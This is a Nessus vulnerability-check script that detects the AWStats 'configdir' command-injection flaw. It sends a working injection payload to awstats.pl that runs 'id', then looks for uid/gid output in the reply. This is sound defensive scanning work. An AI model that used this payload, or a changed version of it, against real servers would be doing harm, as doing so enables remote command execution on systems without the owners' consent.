#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#
# Ref: iDEFENSE 
#
# This script is released under the GNU GPLv2
#
# changes by rd: changed the web reqeuest

if(description)
{
 script_id(16189);
 script_bugtraq_id(12270, 12298);
 script_version("$Revision: 1.2 $");

 name["english"] = "AWStats configdir parameter arbitrary cmd exec";

 script_name(english:name["english"]);
 script_version ("$Revision: 1.2 $");
 
 desc["english"] = "
The remote host is running AWStats, a free real-time logfile analyzer.

The remote version of this software is prone to an input validation 
vulnerability. 

The issue is reported to exist because user supplied 'configdir' URI data passed
to the 'awstats.pl' script is not sanitized.

An attacker may exploit this condition to execute commands remotely or disclose 
contents of web server readable files. 

Solution : Upgrade at least to version 6.3 of this software
Risk factor : High";



 script_description(english:desc["english"]);
 
 summary["english"] = "Determines the presence of AWStats awstats.pl flaws";

 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2005 David Maciejak");
 script_family(english:"CGI abuses", francais:"Abus de CGI");
 
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if ( ! port ) exit(0);

function check(url)
{
 req = http_get(item:url +"/awstats.pl?configdir=|echo%20Content-Type:%20text/html;%20echo%20;id|%00", port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 if ( res == NULL ) exit(0);
 if ( egrep(pattern:"uid=[0-9]+.*gid=[0-9]+", string:res) )
 {
        security_hole(port);
        exit(0);
 }
}

check(url:"/awstats");
foreach dir ( cgi_dirs() )
{
  check(url:dir);
}
